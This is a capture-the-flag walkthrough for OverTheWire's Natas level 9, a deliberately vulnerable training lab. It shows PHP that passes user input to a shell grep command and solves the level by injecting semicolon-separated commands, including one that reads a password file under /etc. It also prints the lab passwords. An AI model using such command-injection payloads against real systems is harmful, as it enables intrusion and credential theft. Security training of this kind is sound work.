## [Natas Level 9->10](http://natas9.natas.labs.overthewire.org)
#### Natas9 Password: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

Looking at the source code, we find:
````
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
````

It looks like $key is the input in "grep -i $key dictionary.txt". If we use a semicolon somewhere in our input, we can divide the line into >1 command.

For example, using the input "; echo 'hi';" will exec the command
````console
grep -i ; echo "hi"; dictionary.txt
````
causing the Output to say "hi".

Navigate files and look for anything suspicious. Eventually, we come across natas_webpass when using the input '; ls ../../../../etc;'. Opening the natas10 file in this folder will likely result in the password for natas10. Use the input '; cat ../../../../etc/natas_webpass/natas10;' to open the correct file.

The password for natas10 is nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu.
